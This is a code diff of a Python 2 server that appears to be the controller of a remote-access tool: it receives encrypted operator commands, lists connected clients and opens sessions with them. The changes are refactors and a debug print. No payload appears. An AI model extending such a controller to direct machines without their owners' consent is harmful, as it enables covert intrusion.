@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-#import json
 import os
 from socket import *
 import sys
@@ -85,7 +84,7 @@ def sendController(msg, q):
 ## User Login Verification
 ## ############################
 def verifyUser(credentials):
-	Passwd = Decode().cpassword(credentials)
+	Passwd = Api().main(credentials)
 	if (Passwd == password): 
 		print " [+] Authetication Successful"		
 		return True  
@@ -181,7 +180,8 @@ def main():
 			try: 
 				message = q.recv(20480)
 				Message = encryption().decrypt(message, config["password"])
-				command = Decode().serverProcess(Message)
+				print Message
+				command = Api().main(Message)
 				print " [+] Recieved Command: {CMD}".format(CMD=command)
 			except: break
             
@@ -200,7 +200,7 @@ def main():
 				sendController(clientList, q)
 
 			elif(command == "interact"):
-				client = Decode().serverProcessClient(Message)
+				client = Api().serverProcessClient(Message)
 				if ((int(client) <= len(allAddresses)) and (int(client) >= 0 )):
 					body = {"status":"OK", "command":"interact", "reply": "Connecting To Client", "error": "null"}
 					reply = Encode().process(body)
@@ -227,10 +227,12 @@ def main():
 				reply = encryption().encrypt(reply, config["password"])
 				if (sendController(reply, q) == 0): break
 				else:pass
-print config["intro"]
-while True:
-	try: main()
-	except KeyboardInterrupt: quitClients()
-	except: quitClients()
+				
+if __name__ == "__main__": 
+	print config["intro"]
+	while True:
+		try: main()
+		except KeyboardInterrupt: quitClients()
+		except: quitClients()
 
-	time.sleep(5)
+		time.sleep(5)
